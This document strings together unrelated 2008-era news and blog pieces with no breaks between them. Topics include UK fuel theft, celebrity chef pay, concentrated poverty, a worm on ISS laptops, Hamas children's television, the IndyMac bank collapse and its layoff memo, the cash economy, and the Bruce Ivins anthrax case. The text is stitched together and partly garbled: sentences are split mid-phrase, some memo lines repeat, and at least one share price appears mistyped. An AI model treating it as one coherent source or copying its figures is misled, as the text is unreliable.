It is difficult to obtain precise figures to illustrate the extent of the problem .
The Association of Chief Police Officers ' vehicle crime intelligence service ( Avcis ) , has only started collating the statistics relating to fuel theft in the last two months .
However , Cumbria police said the number of thefts of red diesel , which farmers use in tractors and other agricultural vehicles , had increased in its area by 75 % in the first three months of this year .
North Wales police said fuel thefts had doubled in six months in some of its areas .
Esure , the insurers , released a survey this week in which they claimed that more than 5 million private motorists - almost one in six - had been the victim of fuel theft or knew someone who had been .
It pinpointed East Anglia as a hotspot .
NFU Mutual , which insures many farmers , said claims concerning thefts of red diesel for the first five months of this year were up by 30 % on the same period in 2007 .
It highlighted Co Durham and Cornwall as problem areas .
Richard Dodd , a Northumberland farmer and north - east director of the Countryside Alliance , said : " Three years ago red diesel was 11 p a litre and now it 's 70 p .
It has become worthwhile for criminals to target farmers ' diesel tanks .
There are rich pickings to be had . "
While once farmyards were bustling places , changing working practices mean they are often deserted for long periods .
Tim Price , a spokesman for NFU Mutual , said farmers were often hit by a double whammy .
After the thieves take what they want , they leave valves open and let fuel leak out .
Farmers face a bill for the fuel , which is usually covered by insurance , but also one for cleaning up the mess , which may not be .
Cowpe 's fuel loss , for instance , amounted to £ 6,000 - the other £ 60,000 was to cover the clean - up .
Price said the gangs were undoubtedly organised .
Ten years ago , when there was a spike in diesel prices , thieves stole small amounts but today they are draining tanks .
They need pumps , vehicles fitted with large containers to whisk the fuel away and a ready market to sell it to .
NFU Mutual has heard of farmers moving their supplies into secure , guarded compounds - but the worry is that thieves will see these mini-depots as even more tempting targets .
Truckers are used to taking precautions to protect their valuable loads but now they are having to try to guard their fuel caps when they are parked .
David Webb , managing director of Cambridgeshire hauliers G Webb , said thieves were parking some distance from targets , prising open diesel tank caps , running long hoses into them and pumping fuel out at their leisure as the driver sleeps .
Depots are also being hit regularly .
Webb 's company is spending tens of thousands of pounds on protecting its depot and has even redesigned its tipper trucks to make the fuel tank less accessible .
" But we can't stop the thieves .
If they are determined enough , they will get through , " said Webb .
Then there are the ordinary motorists .
Chevrolet driver Alastair Fox , who works for the probation service , was one of seven motorists whose fuel caps were prised off in a car park in the village of Pin Mill , Suffolk .
" It 's annoying more than anything .
It was parked in a car park and you worry that they must be prowling around there . "
He lost about £ 20 of fuel and has not even bothered to report the matter to the police .
Many householders , too , who rely on oil for their heating feel someone is watching them .
The web - based oil company BoilerJuice has received dozens of reports of tanks being drained .
Again , there is good money to be made - a 1,000 - litre tank holds more than £ 600 of fuel .
One victim , Jon Ward , of West Sussex , has gone to great lengths to stop thieves striking at his tank again .
He has three dogs in his garden , has set up security lighting and CCTV and built a fence topped with razor wire .
" Let the bastards try it now .
Shotgun is also at the ready , " he said .
Privately , police forces admit they are struggling .
Paul Labotte , head of Avcis , urged drivers to take extra care .
But even he said haulage companies and drivers were in an " awkward " position .
If they try to secure diesel or petrol tanks they may face a double whammy - the thieves could drill a hole through the tank and the driver will be facing a bill for the fuel and the damage caused .
There have been a few successes .
Drive - offs from petrol stations rose by 13 % last year , at a cost of £ 32.5 m .
Jaginder Singh Mudhar 's family had to close down their petrol station in the Midlands because they were so badly hit by drive - offs - so he decided to invent a device to stop it happening to other people .
The Drivestop device , a set of spikes that puncture tyres if someone tries to leave a forecourt without paying , has been installed at 18 sites .
Drive - offs at these forecourts have stopped completely .
How much does your favorite celebrity chef earn in a year ?
Forbes.com has the skinny , though in its typically annoying way , it makes the reader click more than ten times to get the entire list ( do n't worry , we 've got you covered ) .
Though the raw numbers are certainly impressive compared to what anonymous toqued toilers made pre-Food Network , celebrity chefs do n't appear to fare well compared to , say , celebrity sports figures or actors or even the highest - paid lawyers and doctors .
The bottom line is that celebrity chefs , like Donna Summer sang , work hard for their money .
Why is is that celebrity chefs do n't even make as much as Paris Hilton ?
A few reasons .
Cable salaries are markedly lower than broadcast network salaries , and there are no chefs starring in their own broadcast network series .
Stars of successful nationally syndicated series can make seven figure annual salaries , and that fact explains why Rachael Ray tops the list .
She is the only celebrity chef with a daily nationally syndicated television show ( I guess Forbes does n't consider Martha Stewart a celebrity chef ) .
Even chefs with their own daytime series on Food Network make surprisingly little money .
Very few celebrity chefs get seven figure book advances , and cookbooks rarely if ever become millions - of - copies - sold best - sellers like James Patterson 's or J.K
Rowling 's books .
I would guess that Mark Bittman 's How to Cook Everything and the latest edition of The Joy of Cooking are probably the two best - selling cookbooks of the last ten years , and neither of those tomes would allow their authors to retire right now .
Unlike musical stars , celebrity chefs can't make millions of dollars going on tour like , say , Bruce Springsteen , Sting , or the Rolling Stones .
Some chefs may demand and even receive $ 100,000 plus expenses for an appearance , but they do n't get more than a handful of those offers in a given year .
Lastly , only Rachael Ray has the kind of lucrative celebrity endorsements that can net millions of dollars by themselves ( see Dunkin ' Donuts ) .
After the jump , the Forbes list .
The only surprises for me were that Giada De Laurentiis , who does have a network television contract ( with NBC ) , did n't make the list , nor did Jean - Georges Vongerichten , who seems to have a restaurant in every industrialized country .
What about you , serious eaters ?
Anybody else you think should have made the list ?
1. Rachael Ray : $ 18 million
2. Wolfgang Puck : $ 16 million
3. Gordon Ramsay : $ 7.5 million
4. Nobu Matsuhisa : $ 5 million
5. Alain Ducasse : $ 5 million
6. Mario Batali : $ 3 million
7. Paula Deen : $ 4.5 million
8. Tom Colicchio : $ 2 million
9. Bobby Flay : $ 1.5 million
10 . Anthony Bourdain : $ 1.5 million

One less visible aspect of the economic boom of the 1990s was a decline in the number of low - income working people who lived in very poor neighborhoods .
But that trend has reversed during the first five years of this decade , according to a new analysis by the Brookings Institution , a nonpartisan think tank in Washington .
It found that the number of poor people who live in areas of concentrated poverty increased by 41 percent since 1999 .
" Many of these neighborhoods that made these great gains in the 1990s – with the downturn in the beginning of this decade and the weak recovery – have been hit hard by this economic change , " says Elizabeth Kneebone , lead author of the report and a senior research analyst at Brookings ' Metropolitan Policy Program .
" We 've lost a lot of ground and see poverty again increasing in these neighborhoods . "
Such increases in concentrations of poor people in specific neighborhoods create a kind of self - perpetuating economic segregation , says Ms. Kneebone .
That 's because low - income neighborhoods generally have lower - performing schools , less access to good jobs , poorer health outcomes , higher crime rates , and less economic investment .
" As people try to work their way out of poverty , they do n't find as many of the opportunities they need in very low - income neighborhoods , " she says .
" All of this creates the cycle that perpetuates poverty . "
With a few exceptions , the biggest jumps in poverty - concentration levels were found in urban metropolitan regions of the Northeast and Midwest , including New York , Philadelphia , and Detroit , according to the report .
Many regions in the West and Southwest , which have fared better economically during the past seven years , actually saw drops in concentrations of poverty .
They include the San Diego and Sacramento metro areas in California .
But the report also found some wide geographic variations .
For instance , Fresno , Calif. , has one of the highest rates of concentrated poverty , while the Washington , D.C. , metro area has one of the lowest .
Researchers defined high concentrations of poverty as areas where at least 40 percent of the residents filed for the Earned Income Tax Credit ( EITC ) , which is a tax credit for low - wage workers .
" Concentrated poverty is problematic because there 's basically less opportunity for people to really improve their living standards , " says Jared Bernstein , director of the Living Standards Program at the Economic Policy Institute in Washington .
" But [ the solution ] ca n't just be a matter of moving people out of poor neighborhoods .
We also have to think about creating opportunities within those neighborhoods . "
Later this month the Census Bureau will release its official analysis of the poverty rate for 2007 .
Mr. Bernstein forecasts that it will come in at about 12.1 percent , a small drop from 12.3 percent in 2006 .
But he notes that even with a small drop in 2007 , the poverty rate is still significantly higher than it was in 2000 .
" In 2000 , the poverty rate was 11.3 percent , " he says .
" It 's almost impossible for us to have a poverty rate now that it 's lower than it was then . "
The virus travelled on a laptop issued to an astronaut A computer virus is alive and well on the International Space Station ( ISS ) .
Nasa has confirmed that laptops carried to the ISS in July were infected with a virus known as Gammima .
AG .
The worm was first detected on Earth in August 2007 and lurks on infected machines waiting to steal login names for popular online games .
Nasa said it was not the first time computer viruses had travelled into space and it was investigating how the machines were infected .
Orbital outbreak Space news website SpaceRef broke the story about the virus on the laptops that astronauts took to the ISS .
Nasa told SpaceRef that no command or control systems of the ISS were at risk from the malicious program .
The laptops infected with the virus were used to run nutritional programs and let the astronauts periodically send e-mail back to Earth .
The laptops carried by astronauts reportedly do not have any anti-virus software on them to prevent infection .
Once it has scooped up passwords and login names the Gammima .
AG worm virus tries to send them back to a central server .
It targets a total of 10 games most of which are popular in the Far East such as Maple Story , HuangYi Online and Talesweaver .
Nasa is working with partners on the ISS to find out how the virus got on to the laptop in the first place .
The ISS has no direct net connection and all data traffic travelling from the ground to the spacecraft is scanned before being transmitted .
It is thought that the virus might have travelled via a flash or USB drive owned by an astronaut and taken into space .
The space agency also plans to put in place security systems to stop such incidents happening in the future .
Nasa told Wired News that viruses had infected laptops taken to the ISS on several occasions but the outbreaks had always only been a " nuisance " .

What are these ?
Those gifted storytellers at Hamas television are at it again .
Previously , we saw their popular television program for children feature killer puppets and an anti-Israeli Mickey Mouse .
Now , the popular Hamas children ’s television program shows a giant bunny character who steals money and then has the child host sentence him to having his paw cut off .
The letter of the day , it appears , is A for amputation .
In March , a segment on Al - Aqsa showed a boy stabbing President Bush to death after exclaiming , “ I will kill you , Bush , because that is your fate . ”
It is Al - Aqsa use of cute characters for horrific scenes that has become its signature .
Al - Aqsa television aired its cute little amputation discussion on “ The Pioneers of Tomorrow . ”
Assud the Bunny expresses reluctance in stealing from his father ( who is strangely human ) but the devil convinces him to do it .
Assud then discusses his crime with child TV host Sara and a young girl — expressing his shame and remorse .
But the host says “ The Prophet Muhammad said : ‘ If my daughter Fatima had stolen , I would have chopped off her hand .
If you were in Saudi Arabia now , they would chop off your hand . ' ”
The children then debate the amputation with one proposing a compromise that involves cutting off an ear .
The Grouch and the Cookie Monster are certainly lucky that he does not live on Sharia Street at Al - Aqsa .

In a press release Friday , March 20th , it was announced that FDIC had completed the sale of IndyMac Federal Bank to newly formed Pasadena , CA based OneWest Bank Group LLC .
OneWest , led by Terry Laughlin , also acquired reverse mortgage unit Financial Freedom .
OneWest was formed by the partnership led by private equity firm Dune Capital Management -- a group that includes billionaire George Soros and Dell Inc. founder Michael Dell -- who agreed to buy the failed bank for $ 13.9 billion .
The FDIC " stands to lose $ 10.7 billion " in the deal .
Although the press release states the newly formed bank " does n't plan to close any existing branches " in the IndyMac acquisition , we have received reports that a call center in Kansas City was shut down with operations moved to Austin , TX as part of the process .
Rumors that as many as 700 employees may be ( or have been ) laid off were later said to have been exaggerated .
Update - 2009-01-02 :
As first reported in the Mortgage Lender Implode - O - Meter on 2008 - 12 - 26 , the FDIC said in a press release today that it had entered into a Letter of Intent to sell Indymac Federal Bank FSB for approximately $ 13.9 billion to IMB HoldCo LLC , a thrift holding company controlled by IMB Management Holdings LP .
IMB HoldCo is owned by a consortium of private equity investors led by Steven T. Mnuchin of Dune Capital Management LP .
In an attachment to the release , FDIC indicates the transaction will be structured as the sale of New IndyMac to IMB HoldCo .
New IndyMac is comprised of :

" We have just confirmed word that IndyMac will only fund the [ co. name deleted ] loans that are currently in their pipeline if they receive a 1 % on that total pipeline from us .
Suffice it to say that we are not in a position to forward more than $ 100,000 to guarantee that these loans will close .
It is our suggestion at this time that you pull your existing loans and send them to other lenders .
We would suggest The Money Store , New Line or Taylor Bean & Whitaker . "

From an email this morning : " Indy Mac is closing TODAY .
The entire Marlton NJ office is apparently being shut down and their other operations offices are closing .
All wholesale operations are gone . "
As this news rolls across the country , we will keep you updated on developments .
One source says as many as 4,000 people will be laid off .
It 's early in the day , but an official announcement is expected within hours as to the extent of the shutdown .
7:45 am ( PDT ) - Bloomberg is showing trading halted .
Original Ailing / Watch Listing - 2008-06-30 ( 6:30 pm EST ) : At 5:45 pm ( EST ) , the following email was sent to customers of Indymac 's commercial lending unit , Indymac Commercial Lending Corp. : " ICLC , due to the current market and capital constraints has ceased lending operations as of 7/1/08 .
A formal announcement from ICLC will be coming out tomorrow regarding details and loans in process . "
An official notice was sent out shortly thereafter .
Referring to today 's press release on The IMB Report , Indymac 's company web site , an LA Times report refers to " a weekend that saw depositors line up at some of its San Gabriel Valley branches to pull their money , as they reacted to news reports questioning the company 's survival . "
Indymac 's article responds with " while branch traffic is somewhat elevated this morning , it is substantially lower than on Saturday , and we are hopeful that this issue appropriately abates soon ... "
A thread for the ICLC shutdown has begun on our Discusssion Forum .
Update - 2008 -06-30 : After the opening bell , Indymac Bancorp Inc. shares dipped to a morning low of $ 0.60 .
IndyMac was one of 12 stocks removed from the Russell 1000 , moved to the small - cap Russell 2000 Index per Yahoo Finance .
Meanwhile , the Center for Responsible Lending released a report today titled " IndyMac : What Went Wrong ? , " in which it " finds substantial evidence that IndyMac routinely made loans with little regard for their customers ' ability to repay the loans " according to The Earth Times .
" CRL 's investigation provides a body of evidence that discredits the idea that IndyMac and other lenders were victims of overreaching borrowers or rogue mortgage brokers , " says Michael Hudson , the report 's primary author and a senior investigator at CRL .
" IndyMac 's current problems appear to be largely the legacy of top - down pressures that valued short - term growth over making responsible lending decisions . "
That surely can't have a positive effect .
Shares continued to struggle , closing at $ .062 , down over 23 % from the morning 's open of $ 0.81 .
Update - 2008 -06 - 26 : IndyMac shares are finally down to a mid-day low of $ 0.94 at one point .
One of our sources states , " Pretty much we were told informally that if we did not get a capital infusion we would not make it and that we had a 50/50 chance of obtaining said infusion . "
Update - 2008 -06 - 23 : Shares of IndyMac have fallen in the past year from $ 32.54 down to $ 1.32 at mid-day today .

Update - 2008-02 - 12 : From Yahoo !
Finance , Feb. 12 , 2008 : " LOS ANGELES ( AP ) -- IndyMac Bancorp Inc. reported the first annual loss in company history Tuesday and scrapped its dividend to shore up capital .
The holding company for IndyMac swung to a fourth - quarter loss as weakness in the housing market forced the mortgage lender to boost provisions for future credit losses from rising defaults , repossessions and other costs . "
CEO
Perry takes the blame , kills the dividend , and blamed the " errors " on management .
Perry offered to quit if not re-elected as CEO .
Now that makes a lot of sense .
Update - 2008-01 -31 :

Our Forum has been very busy with opinions , detail , and questions on this subject .

Original Ailing / Watch Listing - 2008-01-09 : News is n't readily forthcoming , but adding up the little bits it becomes rather obvious : this company is in trouble .
There have been a slew of articles recently , scattered across the business world about the current ' state of things . '
Most recently , an article from Reuters casts serious doubt on the future for IndyMac : " Growth in the pipeline and resulting production volume may be negatively impacted by further credit tightening currently being implemented by the GSEs that is requiring IndyMac to implement another round of credit guideline tightening , " the company said on its corporate blog , www.theimbreport.com, on Jan .
4 . Total loan production of $ 4 billion in November was " essentially flat " from October , it said .
The loan pipeline of $ 10.7 billion was down 20 percent for the 12 months to November and up 9 percent from October .
IndyMac Chief Executive Officer Michael Perry last month said he expected the Pasadena , California - based lender will be profitable by the second half of 2008 .
Its $ 202.7 million third - quarter loss was more than five times larger than projected as delinquencies mounted . "
One large Net Branch operation has put out the word " not to use IndyMac as they think they will have funding problems . "
All the while , we have had tips coming in about layoffs , program / product cuts and new restrictions .
Like many other lenders going through a similar contraction in today 's market , Subprime is gone and Alt - A has been priced out of market .
Killing product is a sure way to drive out the AE's , and just before Christmas one tipster wrote : " ... several of us just walked out after they once again , cut programs ... they cut the comp plan for the 5th time in 7 months ... and max pricing on any jumbo Alt - A is 99.00 , so it will cost the broker 1.00 just to do the deal .
This used to be Indy 's bread and butter .
They also put out a voluntary resignation for all A.E. 's last week .... word is they are going retail .
The CEO reiterated over and over that everyone was " safe " and Indy was as strong as ever ... "
And another tip : " 600 ae's are collecting $ 2500 per month and close 2 - 5 loans per quarter .
The math is simple get rid of them "
In our Premium Newsletter from Dec. 17th , we reported on IndymacBank GrupoMac .
According to their web site this division within Indymac Bank called GrupoMac is a " Top 5 Wholesale Lender ... focused on serving Spanish - speaking customers . "
Rumor has it that this division will be closed and Mark Mozzilo ( CEO ) is rumored to have left Indymac or leaving to another Indymac unit .
One tipster writes , " None of the ae's from grupo mac will transfer all of them will be laid off . "

Are you saying you did refuse to sell those products because they are " irresponsible ? "
Irresponsible lender huh , I think almost every lender went out of control over the last few years , not just CW or IMB .
Sure IMB does do a lot of volume and has probably taken much of your business to this day , but they were not any different to any other lender in terms of products .

In this very difficult and challenging environment , any of the actions that we take to keep Indymac safe and sound unfortunately have negative consequences to some important constituency .
As we stated in our financial update on May 12 , 2008 , we have been working with our investment bankers to raise additional capital .
To - date , we have not been successful with these efforts , and , while we will continue these efforts with our bankers and others , we do n’t expect to be able to raise capital until there is more stability and less uncertainty in the housing and mortgage markets .
While some shareholders may believe it is in their best interests that we not raise capital right now given the significant dilution that it would cause , there are consequences of not being able to raise more capital and , therefore , actions that we now must take .

Given the continued downward trend in home prices and a resulting increase in our forecasted credit losses and the related downward trend in the pricing of all mortgage related assets in the capital markets , especially mortgage - backed securities where we have experienced significant rating agency downgrades this quarter , we expect our loss for the second quarter to be larger than Q108 , but it is difficult at this time to be more precise given the significant uncertainty surrounding accounting estimates , fair value accounting and other accounting matters .

In light of the current environment and related deterioration of our financial position since last quarter , we have been working closely with our federal banking regulators with respect to the actions that they and we must take to meet our mutual goal of keeping Indymac safe and sound through this crisis period .
In that respect , based on information we have provided to our regulators , they have advised us that we are no longer “ well capitalized ” , which we stated on May 12 was a possible scenario .
Our regulators have also asked us to submit to them a new business plan for their review and approval , something on which we have been working with them for some time .
We have agreed on the basic elements of the plan , and the regulators have directed us to begin executing on it .
An important element of our plan is to improve our capital ratios .
Without an external capital raise , the traditional way to improve safety and soundness is to sell assets and shrink the balance sheet , which in normal times generally has the effect of improving capital ratios and bolstering liquidity .
Yet in this environment , where either there are no bids for most of IMB ’s mortgage loans and securities or the bid / ask spreads are abnormally wide , “ fire - selling ” assets would actually deplete capital further .
As a result , the most realistic and cost - effective way to shrink both our balance sheet and our servicing rights asset ( which , as discussed in previous communications , is up against the regulatory cap limit ) , is to curtail most new loan production .

In addition to needing to shrink our assets to improve our capital ratios , we also need to do so to ensure that we maintain prudent operating liquidity .
A consequence of falling below well - capitalized is that we are no longer permitted to accept new brokered deposits or renew or roll over existing ones , unless we get a waiver from the FDIC .
While we have submitted a waiver application , it is uncertain as to whether such a waiver will be granted .

While we have submitted a waiver application , it is uncertain as to whether such a waiver will be granted .
As a result of the above , we have made the difficult decision , effective July 7 , 2008 , that we will no longer accept any new loan submissions or rate locks in our retail and wholesale forward mortgage lending channels , except for our servicing retention channel .
We plan to honor all of our existing rate - locked loans and will continue to fund these loans in the coming weeks .
While the managers and employees in these units have worked incredibly hard , these units are not currently profitable due to the continuing erosion of the housing and mortgage markets .
At the same time , these operations take up significant balance sheet capacity and “ feed ” growth in the servicing asset , an asset we need to shrink given its size relative to our existing capital .

At the same time , these operations take up significant balance sheet capacity and “ feed ” growth in the servicing asset , an asset we need to shrink given its size relative to our existing capital .
In closing our forward mortgage business , we will refocus our lending efforts on supporting and building within regulatory constraints Financial Freedom , our reverse mortgage unit ( FHA production only ) , and on continuing the retention activities associated with our servicing portfolio .
Combined , we currently expect these units to produce roughly $ 5 billion to $ 10 billion per year of new FHA / GSE loans .
Thus , our core business model will include ( 1 ) Financial Freedom , one of the largest reverse mortgage lenders in the Country ; ( 2 ) a top ten mortgage loan servicing operation , with a solid retention production unit ; and ( 3 ) a Southern California retail bank branch network , including 33 branches and roughly $ 18 billion in deposits , of which over 96 % is fully covered by FDIC insurance .
In addition , when this housing and mortgage crisis abates and we return to health , we would also hope to be an investor in mortgage loans and mortgage - backed securities and might re-enter the national forward mortgage production business with a low - cost , non-commissioned - based business model .

Unfortunately , the above actions will necessitate the reduction in our present workforce from approximately 7,200 to roughly 3,400 or so over the next couple of months , which should reduce our operating expenses by roughly 60 % .
We will retain about 1,100 employees in loan servicing in Kalamazoo and Austin ; 350 in our servicing retention group in Irvine and Kansas City ; 800 at Financial Freedom , primarily in Irvine , Sacramento , and Atlanta ; 400 in our Southern California retail and web bank ; 500 in portfolio management and administration , largely in Pasadena ; and 250 in discontinued businesses .
In building Indymac up from 4 employees in 1993 to its present size , we have had to retrench and then rebuild several times over the past 15 years , but clearly these are the largest and most difficult staff reductions we have ever had to make .
If we had another alternative , we clearly would have chosen it , as we understand how painful these workforce reductions can be for the affected employees and their families .
Given Indymac ’s current financial position and these significant layoffs , I strongly believe it is appropriate that I further materially reduce my own compensation .
As a result , I have requested of Indymac ’s Board of Directors that they reduce my base salary by 50 % .

With respect to severance , our policy has always been that the fair and right thing to do is to provide our departing employees with a generous severance program to ease their transition to the next stage of their career .
Our severance program , which provided one month of pay and one month of Indymac - paid COBRA insurance coverage for each year of service , was clearly the most generous in the mortgage industry , if not among most of the Fortune 500 .
I very much regret that the reality today , however , is that we can no longer afford this program given our need to preserve capital and return to profitability .
Therefore , we will be providing employees with a minimum 30 - day notice of the termination of their employment ( effectively , 30 days severance ) , with employees covered under the Federal WARN Act and similar state statutes ( “ WARN ” ) receiving 60 days of advance notice prior to the effective date of the their termination .
Affected employees with five or more years of service will receive a minimum $ 20,000 severance , including any compensation payments made during the notice period .

With all of the above said , in this environment plans can change often and quickly ( e.g. ability to raise capital and / or liquidity , regulatory actions , etc. ) .
All we can do is continue to work hard and do our very best to keep Indymac safe and sound , so that we can rebuild our workforce and shareholder value when the housing and mortgage markets stabilize .
We will be providing more information on our plans and prospects when we release Q208 earnings .

Atleast hopefully some Indymac employees will walk away with some $ $ .
They could be like the saps at Alliance Title / Financial Title , who walked away with nada , no severance , no accrued vaca pay , nada zip .
They got a one hours notice .
Hasta la vista baby , and dont let the door ~ Permalink Can we say GREED ..

So you ’ve been playing around with your tux box for quite some time now .
Experimenting with tar balls , the terminal , packages , distros , etc. may now be a part for your daily routine .
If you remember , we talked about the existing career opportunities with Linux in a two - post article , few days back .
A lot of youngsters admired that nibble of information .
Keeping them in mind , I decided to come up with something that would emphasize more on learning the concepts rather than just trying things out randomly .
( I know it ’s fun though ! )
At this stage , or may be sometime in the near future if you plan to get your Linux knowledge a formal nurturing , an online course may be something you would be interested in !
These courses would be beneficial for people who have time and interest to master the art of Linux step by step .
You may try them out and come up with a feedback as comments to this post .
These were a few free online course websites for Linux learners .
One of these may suit you the best !
Stay tuned for more .

These were sharp businessmen , the four guys who pointed out that there were three dead trees in my backyard that needed to be cut down lest they attract horrible bugs that would infest my entire property .
They would cut them down and remove them for $ 475 .
In cash .
We dickered back and forth and finally settled on $ 350 .
In cash .
They attacked the trees like ants on ice cream .
In 45 minutes , the trees were gone without a trace .
I paid them .
In cash .
I did n’t break any laws in paying them this way .
They broke no laws in accepting cash only .
The state is egregiously invasive in our financial affairs but it has n’t actually banned the use of cash .
So it was last weekend when I was traveling and needed some copies made from a Pakistani - owned copy shop in the Midwest .
They would provide them on high quality , colored paper for 15 cents each , but only if I paid in cash .
And so I did .
I asked for a receipt .
Whoops , the printer on the receipt machine was acting up so she had to write a receipt by hand .
It was indecipherable , but I took it anyway .
Again , I was n’t breaking any laws in paying with cash and she was n’t either .
And yet we all intuit that there is some reason why cash payments are more valuable in the American service sector than checks or credit cards , nudge nudge , know what I mean ?
With cash , you enjoy the highest likelihood of staying out of harm ’s way .
If you do n’t want to formalize your business model and get embroiled in the entire public - sector apparatus of withholding tax , social security , mandated health care , minimum wages , and the rest of the mind - boggling apparatus of central planning , doing a cash - only business is the wisest choice .
Now , this is interesting .
The social apparatus of taxing and regulating is said to be good for us all .
Without it , our sense of well being would plummet .
We need worker protection and all the glorious services of the state .
We need protection in old age , and protection from exploitative capitalists .
We comply with the whole command - and - control burden because we are better off as a people than if we acted merely on our own .
So let ’s say that I apply this in the two cases mentioned above .
I have a sneaking suspicion that my tree - cutting friends are cutting their tax burden as well , and I wonder about this Pakistani printer .
Maybe they are not paying minimum wage to those employees nor taking out social security nor providing medical benefits .
So , as a good citizen , I make an inquiry .
I demand to see their immigration papers and tax records .
I look them up in the official directory of obedient businesses , if such a thing exists .
I conclude that these are unseemly operators .
It ’s true that I know I can get good service from them but I do not want to partake in a transaction that will hurt others in society .
Regulations and taxes are good for everyone , and so I will have no part in this black - market activity .
So I decline to hire these tree cutters .
I decline to let this lady make copies for me .
I wash my hands of the unsightly mess and move on .
What happens ?
Well , my dead trees still stand , and my copies are unmade .
The suppliers are denied a chance to serve others and profit from it .
A transaction that both sides desired does not take place .
Under the theory that regulations and taxes are good for us , we should both feel better that we did n’t exchange .
Somehow we do n’t .
Or let ’s say that the suppliers of these services suddenly experience a conversion , and , newly enlightened as to their civic obligations , they decide to formalize their operations .
But of course that means that the tree cutting service is now one third more expensive , and the copies cost that much more too .
I decide that it ’s just not worth it , and the exchange does n’t happen .
Again , we should feel better but somehow we do not .
The question I keep asking is : how is society actually better off ?
My copies are unmade , my trees are uncut , and these businesses lose profits , which means that they have less for providing for their children and for making a good life for themselves .
This is especially tough in recessionary times when the prices of everything are rising and unemployment threatens all marginal workers .
Try as I might , I just do n’t believe that anyone is really getting hurt in a cash exchange that enters into the grey area between the underground economy and the official economy .
In the developing world where government bureaucrats rule everything with outrageous arbitrariness , the sector of society that functions in this grey area is called the “ informal sector . ”
It is a burgeoning area of study for many academics on the right and the left and for different reasons .
It is mostly populated by the poor and the poor have the largest stake in the outcome .
Hans Sennholz wrote an excellent little study on the topic for the Mises Institute back in 1984 .
The upshot is that the larger and more intrusive the government , the more the informal sector flourishes .
It is a safety valve of sorts , one that is ignored by GDP counters and nearly invisible to macroeconomic planners .
One wonders just how large the US informal sector truly is .
I ’m not just talking about the drug trade or prostitution or off - the - books gambling .
I ’m referring to wholly legitimate and wholly legal trades of goods and services that take place outside the purview of the public sector .
I ’m going to venture a guess that every single reader of this article is capable of telling stories similar to mine above .
The cash - only economy is pervasive in the United States .
How big , no one knows for sure , obviously .
The lesson here represents a wholesale overturning of the official rationale for the interventionist state : that it is good for us .
You can turn these informal scenarios around in your head again and again and still fail to see how we as a society are better off when mutually beneficial exchanges that would take place absent intervention fail to take place because of the intervention .
What ’s more , the existence of the informal sector provides a useful blueprint for reform .
They can be completely abolished by lowering the costs associated with compliance .
If the costs of compliance fall low enough , what is informal becomes formal and no one has any reason to continue to hide anything .
The agenda for a free market might be summed up as nothing more than the complete legalization of the prevailing informal sector , which itself is created and sustained by a tax and regulatory burden that is too heavy to be sustained .
And yet the impetus for reform is precisely the opposite .
The politicians believe that if they could stamp out the informal sector , crack down on cash - only business , shut down the fly - by - night tree cutters and photocopiers , we would all be better off .
What will it take for the public sector to begin seeing the informal sector as a model to replicate rather than a symbol of anti-social economic activity ?
In a phrase , it will take an enlightened political class that is more interested in the well - being of society than the power and glory of the state .

The Best of Jeffrey Tucker
AUGUST 1-- The government biodefense researcher who committed suicide as federal prosecutors reportedly prepared to indict him in connection with the 2001 anthrax attacks was committed to a Maryland psychiatric hospital last month after making death threats against a counselor , according to court records .
Bruce Ivins , 62 , who died Tuesday of a drug overdose , had been scheduled to appear yesterday in a Frederick County court in connection with a protective order application filed by Jean Duley , program director of Comprehensive Counseling Associates .
In her July 24 petition , a copy of which you 'll find here , Duley referred to Ivins as a ' client ' who 'has a history dating to his graduate days of homicidal threats , actions , plans , threats & actions towards therapist . '
Duley added that Ivins 's psychiatrist called him ' homicidal , sociopathic with clear intentions , ' and that 'FBI involved , currently under investigation & will be charged w/ 5 capital murders .
I have been subpoena to testify before a federal grand jury August 1 , 2008 in Washington , D.C.. '
Duley 's court filing was apparently triggered by several threatening phone messages left by Ivins early last month .
Her petition for a peace order , which was granted by a District Court judge , added that Ivins was hospitalized last month at Frederick Memorial Hospital and then transferred to Sheppard Pratt , a psychiatric facility .
Ivins , Duley stated , ' was to have commitment hearing July 16th / signed in vol . to get himself out . '
On July 25 , a sheriff 's deputy sought to serve Ivins with court papers at Fort Detrick , but was advised by an Army official that Ivins 'has been barred from the property , ' according to a return of service form filed by the Frederick County Sheriff 's Office .
The peace order against Ivins was formally dismissed yesterday in light of his death .
Ivins , an anthrax researcher , worked for 36 years at the U.S. Army 's Fort Detrick facility , according to an obituary .
Fort Detrick has been has been a focus of federal investigators probing the 2001 attacks , which killed five people , since scientists there , including Ivins , have done extensive research on inhaled anthrax spores .
According to the Los Angeles Times , federal prosecutors were about to file criminal charges against Ivins , and that the researcher had ' been informed of his impending prosecution . '

Actress reckons it could be done in an artistic way
Megan
Fox wants to film an entire movie in the nude .
The Transformers star reckons it would be a hit if it were done tastefully .
‘ I would love to do a movie naked , ’ she tells the Daily Star Sunday .
‘ No one dares to make that kind of film today .
‘ They did it in the 1930s in an arty way , so why not now ? ’
Megan , 22 , recently split from fiance Brian Austin Green , 34 .
This morning , Maury aired one of the weirdest episodes of the past decade , and , considering the show 's usual subject matter , that 's saying a lot .
Today , the guests were all women with strange phobias , like being afraid of Jell - O , chicken , and cotton balls .
Instead of helping these women or having a psychologist talk to them , Maury and his audience laughed at them , and Maury went to extremes to torture them .
For example , Carolyn , a woman who is deathly afraid of cotton balls , has had a recurring nightmare for most of her life about a man made of cotton balls who tries to kill her .
So Mo had two guys dress up in cotton ball costumes and chase her around the studio .
Here 's a tip for Carolyn should anyone try this again : spray the cotton ball men with a hose .
They 'll absorb all the water and hopefully fall down , and you can then commence kicking them in the cotton - less balls .

First Manure - Powered Carnival Ride Makes Its Debut
August 14th , 2008 by Ariel Schwartz
Last week , I wrote about a farm in China that will power itself entirely with chicken manure .
Now poop power has made it to mainstream America with an announcement that the California State Fair will play host to the first known amusement ride powered by cow manure .
The Barnyard Animal Train will use excrement from California dairy cows to create renewable biogas .
Kids taking a ride on the train will also have the opportunity to learn about renewable energy — and of course , will get to experience it firsthand .
At first glance , this may not seem like a big deal .
But state fairs around the United States are joining the alternative energy wagon , albeit not always by using cow manure .
The Minnesota State Fair will feature a wind energy center , the Wisconsin State Fair will contain an energy park , and the North Carolina State Fair will play host to a model “ green home ” .
I remember most of my state and county fair experiences from when I was a kid — so if the exhibits at these state fairs are any indication , today ’s children will have their eye on renewables for a long time to come .

Cyanobacteria : The Next Big Biofuel ?
August 26th , 2008 by Ariel Schwartz
Could cyanobacteria eventually become a more popular biofuel than corn , sugarcane , or even algae ?
Quite possibly .
